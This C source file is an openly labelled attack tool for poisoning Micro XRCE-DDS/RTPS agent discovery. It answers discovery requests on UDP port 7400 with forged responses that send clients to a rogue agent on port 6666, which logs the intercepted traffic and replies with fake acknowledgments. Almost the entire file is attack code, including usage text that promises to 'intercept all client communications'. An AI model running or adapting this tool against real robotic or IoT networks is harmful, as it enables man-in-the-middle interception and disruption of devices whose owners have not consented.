// Compile: gcc attack_discovery_poison.c -o discovery_poison -lmicroxrcedds_client -lmicrocdr -lpthread
#include <uxr/client/client.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define DISCOVERY_PORT 7400
#define BUFFER_SIZE 512

// Structure for DDS RTPS discovery message (simplified)
typedef struct {
    uint8_t protocol[4];  // "RTPS"
    uint8_t version[2];
    uint8_t vendor_id[2];
    uint8_t guid_prefix[12];
} rtps_header_t;

void* rogue_agent_responder(void* arg) {
    char* malicious_ip = (char*)arg;
    
    printf("[*] Starting rogue agent discovery responder...\n");
    printf("[*] Will redirect clients to: %s:6666\n", malicious_ip);
    
    // Create UDP socket for discovery
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return NULL;
    }
    
    // Allow address reuse
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    
    // Bind to discovery port
    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(DISCOVERY_PORT);
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }
    
    printf("[+] Listening on port %d\n", DISCOVERY_PORT);
    
    // Listen for discovery requests
    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    while (1) {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                               (struct sockaddr*)&client_addr, &addr_len);
        
        if (recv_len > 0) {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
            
            printf("[*] Discovery request from %s:%d\n", client_ip, ntohs(client_addr.sin_port));
            
            // Craft malicious discovery response
            uint8_t response[256];
            memset(response, 0, sizeof(response));
            
            // RTPS header
            rtps_header_t* header = (rtps_header_t*)response;
            memcpy(header->protocol, "RTPS", 4);
            header->version[0] = 2;
            header->version[1] = 3;
            header->vendor_id[0] = 0x01;
            header->vendor_id[1] = 0x0F;
            
            // Add malicious agent locator
            int offset = sizeof(rtps_header_t);
            
            // Convert malicious IP to network format
            struct in_addr mal_addr;
            inet_pton(AF_INET, malicious_ip, &mal_addr);
            
            memcpy(response + offset, &mal_addr, 4);
            offset += 4;
            
            // Malicious port (6666)
            uint16_t mal_port = htons(6666);
            memcpy(response + offset, &mal_port, 2);
            offset += 2;
            
            // Send malicious response
            sendto(sock, response, offset, 0,
                  (struct sockaddr*)&client_addr, addr_len);
            
            printf("[+] Sent poisoned response to %s\n", client_ip);
        }
    }
    
    close(sock);
    return NULL;
}

void* rogue_agent_server(void* arg) {
    printf("[*] Starting rogue agent server on port 6666...\n");
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("[-] Socket creation failed");
        return NULL;
    }
    
    struct sockaddr_in bind_addr;
    memset(&bind_addr, 0, sizeof(bind_addr));
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind_addr.sin_port = htons(6666);
    
    if (bind(sock, (struct sockaddr*)&bind_addr, sizeof(bind_addr)) < 0) {
        perror("[-] Bind failed");
        close(sock);
        return NULL;
    }
    
    printf("[+] Rogue agent listening on port 6666\n");
    
    uint8_t buffer[BUFFER_SIZE];
    struct sockaddr_in client_addr;
    socklen_t addr_len = sizeof(client_addr);
    
    while (1) {
        int recv_len = recvfrom(sock, buffer, BUFFER_SIZE, 0,
                               (struct sockaddr*)&client_addr, &addr_len);
        
        if (recv_len > 0) {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
            
            printf("[+] Intercepted data from %s:%d (%d bytes)\n", 
                   client_ip, ntohs(client_addr.sin_port), recv_len);
            
            // Log the intercepted data
            printf("[DATA] ");
            for (int i = 0; i < recv_len && i < 64; i++) {
                printf("%02X ", buffer[i]);
            }
            printf("\n");
            
            // Send fake acknowledgment
            uint8_t ack[] = {0x52, 0x54, 0x50, 0x53}; // RTPS header
            sendto(sock, ack, sizeof(ack), 0,
                  (struct sockaddr*)&client_addr, addr_len);
        }
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char** argv) {
    if (argc != 2) {
        printf("Usage: %s <malicious_agent_ip>\n", argv[0]);
        printf("Example: %s 192.168.1.100\n", argv[0]);
        printf("\nThis will:\n");
        printf("1. Respond to discovery requests\n");
        printf("2. Redirect clients to rogue agent at <ip>:6666\n");
        printf("3. Intercept all client communications\n");
        return 1;
    }
    
    char* malicious_ip = argv[1];
    
    printf("=== Agent Discovery Poisoning Attack ===\n");
    printf("Rogue agent IP: %s\n\n", malicious_ip);
    
    pthread_t responder_thread, server_thread;
    
    // Start discovery responder
    pthread_create(&responder_thread, NULL, rogue_agent_responder, malicious_ip);
    sleep(1);
    
    // Start rogue agent server
    pthread_create(&server_thread, NULL, rogue_agent_server, NULL);
    
    printf("\n[*] Rogue infrastructure running...\n");
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Wait forever
    pthread_join(responder_thread, NULL);
    pthread_join(server_thread, NULL);
    
    return 0;
}